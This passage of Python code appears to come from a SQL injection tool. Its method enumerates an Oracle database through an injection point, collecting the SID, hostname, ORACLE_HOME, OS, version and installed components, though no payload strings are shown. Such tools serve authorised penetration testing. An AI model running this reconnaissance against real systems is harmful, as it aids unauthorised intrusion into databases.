            self.logger.info(
                f"[OracleDatabase] Full version: {result[:100]}... ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate full version ({elapsed:.2f}s)"
            )

        return result

    # ============================================================
    # Main Enumeration Method
    # ============================================================

    def enumerate_all(self, injection_point: str) -> OracleDatabaseResult:
        """
        Perform complete database and environment enumeration.

        Args:
            injection_point: Parameter to inject into

        Returns:
            OracleDatabaseResult: Complete database enumeration result
        """
        self.logger.info(
            "[OracleDatabase] =================================================="
        )
        self.logger.info(
            "[OracleDatabase] PHASE 6: Oracle Database & Environment Enumeration"
        )
        self.logger.info(
            "[OracleDatabase] =================================================="
        )

        result = OracleDatabaseResult()
        total_start = time.time()

        try:
            # Step 1: Basic identification
            self.logger.info("[OracleDatabase] Step 1: Basic identification...")
            result.banner = self.enumerate_banner(injection_point)
            result.database_name = self.enumerate_database_name(injection_point)
            result.instance_name = self.enumerate_instance_name(injection_point)
            result.sid = self.enumerate_sid(injection_point)
            result.service_name = self.enumerate_service_name(injection_point)
            result.host_name = self.enumerate_hostname(injection_point)
            result.global_name = self.enumerate_global_name(injection_point)
            result.oracle_home = self.enumerate_oracle_home(injection_point)

            # Step 2: Platform & OS
            self.logger.info("[OracleDatabase] Step 2: Platform & OS...")
            result.platform = self.enumerate_platform(injection_point)
            result.operating_system = self.enumerate_operating_system(injection_point)

            # Step 3: Version & Edition
            self.logger.info("[OracleDatabase] Step 3: Version & Edition...")
            result.version = self.enumerate_version(injection_point)
            result.edition = self.enumerate_edition(injection_point)
            result.full_version = self.enumerate_full_version(injection_point)

            # Step 4: Database status
            self.logger.info("[OracleDatabase] Step 4: Database status...")
            result.database_role = self.enumerate_database_role(injection_point)
            result.open_mode = self.enumerate_open_mode(injection_point)
            result.log_mode = self.enumerate_log_mode(injection_point)
            result.startup_time = self.enumerate_startup_time(injection_point)
            result.uptime = self.enumerate_uptime(injection_point)

            # Step 5: Time & Date
            self.logger.info("[OracleDatabase] Step 5: Time & Date...")
            result.current_date = self.enumerate_current_date(injection_point)
            result.current_time = self.enumerate_current_time(injection_point)
            result.timezone = self.enumerate_timezone(injection_point)

            # Step 6: Character sets
            self.logger.info("[OracleDatabase] Step 6: Character sets...")
            result.character_set = self.enumerate_character_set(injection_point)
            result.national_character_set = self.enumerate_national_character_set(
                injection_point
            )

            # Step 7: NLS parameters
            self.logger.info("[OracleDatabase] Step 7: NLS parameters...")
            result.nls_language = self.enumerate_nls_language(injection_point)
            result.nls_territory = self.enumerate_nls_territory(injection_point)
            result.nls_parameters = self.enumerate_nls_parameters(injection_point)

            # Step 8: Container/Pluggable
            self.logger.info("[OracleDatabase] Step 8: Container/Pluggable...")
            result.is_cdb = self.enumerate_cdb(injection_point)
            result.is_pdb = result.is_cdb and (result.container_name is not None)
            result.container_name = self.enumerate_container_name(injection_point)
            result.pdb_name = self.enumerate_pdb(injection_point)

            # Step 9: Components & Options
            self.logger.info("[OracleDatabase] Step 9: Components & Options...")
            components = self.enumerate_components(injection_point)
            if components:
                for comp in components:
                    result.add_component(comp)

            options = self.enumerate_options(injection_point)
            if options:
                for opt in options:
                    result.add_option(opt)

            result.success = True

        except Exception as e:
            error_msg = f"Database enumeration failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        total_elapsed = time.time() - total_start

        self.logger.info(
            "[OracleDatabase] =================================================="
        )
        self.logger.info("[OracleDatabase] DATABASE ENUMERATION COMPLETE")
        self.logger.info(f"[OracleDatabase] {result.get_summary()}")
        self.logger.info(f"[OracleDatabase] Total time: {total_elapsed:.2f}s")
        self.logger.info(
            "[OracleDatabase] =================================================="
        )

        self.database_result = result
        return result

    # ============================================================
    # Convenience Methods
    # ============================================================

    def get_database_info(self, injection_point: str) -> dict[str, Any]:
        """Get basic database information."""
        result = self.enumerate_all(injection_point)
        return result.to_dict()

    def get_version(self, injection_point: str) -> str | None:
        """Get database version only."""
        return self.enumerate_version(injection_point)

    def get_instance(self, injection_point: str) -> str | None:
        """Get instance name only."""
        return self.enumerate_instance_name(injection_point)
